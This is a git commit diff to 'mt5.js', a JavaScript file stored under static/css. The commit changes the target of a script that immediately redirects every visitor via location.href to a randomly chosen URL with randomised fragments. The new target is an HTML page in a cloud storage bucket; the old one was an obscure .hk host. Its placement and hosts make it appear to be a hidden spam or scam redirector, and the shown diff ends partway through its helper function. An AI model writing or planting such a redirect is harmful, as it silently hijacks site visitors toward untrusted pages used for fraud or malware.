022ae0de3ee7ed239804b50a54cdfe2309c2f5b5
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-27 18:55:15 +0800

    Update mt5.js

--- static/css/mt5.js
+++ static/css/mt5.js
@@ -1,4 +1,4 @@
-var urls=[' http://pbwci.qun.hk./FtI4zXHgokHP6t_koiBuhQtnX9yu#{nnnnnnn}{wwww}',];
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/0fd1835a9363400b8c7780181b22176d.html#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
